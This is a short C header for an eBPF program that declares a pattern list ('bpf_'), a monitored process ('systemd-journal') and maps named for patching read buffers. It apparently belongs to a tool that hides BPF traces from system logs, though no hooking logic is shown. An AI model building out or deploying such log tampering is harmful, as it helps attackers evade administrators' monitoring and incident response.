//go:build ignore
#pragma once
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

#define MAX_BUF 200
#define MAX_PATTERNS 1
#define MAX_PATTERN_LEN 32
#define PATCH_KEY 0
#define MAX_COMMANDS 1
#define MAX_COMMAND_LEN 20

typedef struct {
    char pattern[MAX_PATTERN_LEN];
    uint32_t len;
} StaticPattern;

typedef struct {
    char command[MAX_COMMAND_LEN];
    uint32_t len;
} StaticCommand;

// You can add more patterns here
const StaticPattern patterns[MAX_PATTERNS] = {
    //{ "Hello", sizeof("Hello") - 1 },
    { "bpf_", sizeof("bpf_") - 1 }
};

// Commands to monitor
const StaticCommand commands[MAX_COMMANDS] = {
    //{ "dmesg", sizeof("dmesg") - 1 },
    { "systemd-journal", sizeof("systemd-journal") - 1 }
};

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[MAX_BUF]);
} patch_map SEC(".maps");

struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 20);
   __type(key, u32);
   __type(value, u64);
} read_buf_map SEC(".maps");